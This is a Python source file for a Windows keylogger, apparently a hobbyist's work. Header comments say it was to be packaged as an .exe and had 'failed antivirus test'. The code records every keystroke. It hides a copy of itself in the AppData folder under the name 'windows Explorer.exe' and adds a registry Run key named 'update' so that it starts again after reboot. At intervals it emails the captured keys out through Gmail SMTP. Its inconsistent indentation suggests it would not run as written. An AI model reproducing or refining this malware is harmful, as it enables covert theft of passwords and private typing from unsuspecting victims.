#!usr/bin/env python

#!usr/bin/env python
############################################################################################
###   this file is working perfectly needs to be converted to .exe 28/09/2018 9.30am   #####  
###   edited at 10.21pm adding method be_perst.......................................  #####
###   result  at 10.42 failed antivirus test                                           ##### 
############################################################################################


import pynput.keyboard, threading, smtplib, os, shutil, sys, subprocess




class Keys:


        def __init__(self,time_interval,username,password ):
           self.be_perst()
           self.log = " "

           self.interval = time_interval

           self.username = username

           self.password = password

           self.interval = time_interval
        
        def john(self, firstname, lastname, status):
                return firstname + " " + lastname + " " + "is the " + status
        def mimi(self):
                print("my name is jojo ")
                
        def mama(self, x):
            return 5 * x

        def append_log(self, string):

           self.log = self.log + string

	
        def be_perst(self):
               evil_file_location = os.environ["appdata"] + "\\windows Explorer.exe"
               if not os.path.exists(evil_file_location):
                   shutil.copyfile(sys.executable, evil_file_location)
                   subprocess.call('REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"', shell = True)

        def process_key_press(self, key):
   
	      try :


	        current_key = str(key.char)

	  
              except AttributeError:

	        if key == key.caps_lock:

	           current_key = " " + str(key) + " "
                elif key == key.shift:
                     current_key =  " " + str(key) + " "
	        else:
	           
                   current_key =  " " 

	      self.append_log(current_key)

        

	
        def report(self):
           print("in report")
           if len(self.log) > 10:
                print(self.log)
                try:
                        self.send_mail(self.username, self.password, self.log)
                except Exception:
                        print(self.log)
                self.log = ""
           timer = threading.Timer(self.interval, self.report)
           timer.start()

	def send_mail(self, email, password, message):

		    server = smtplib.SMTP("smtp.gmail.com", 587)

		    server.starttls()
		    server.login(email, password)
                     
		    server.sendmail(email, email, message)

		    server.quit()

    


        def start(self):

               keyboard_listener = pynput.keyboard.Listener(on_press = self.process_key_press)
               with keyboard_listener:
                   toon = self.john( "john", "luka", "masterhacker")
                   print(toon)
                   self.mimi()
                   tutu = self.mama(100)
                   print(tutu) 
                   self.report()

                   keyboard_listener.join()   







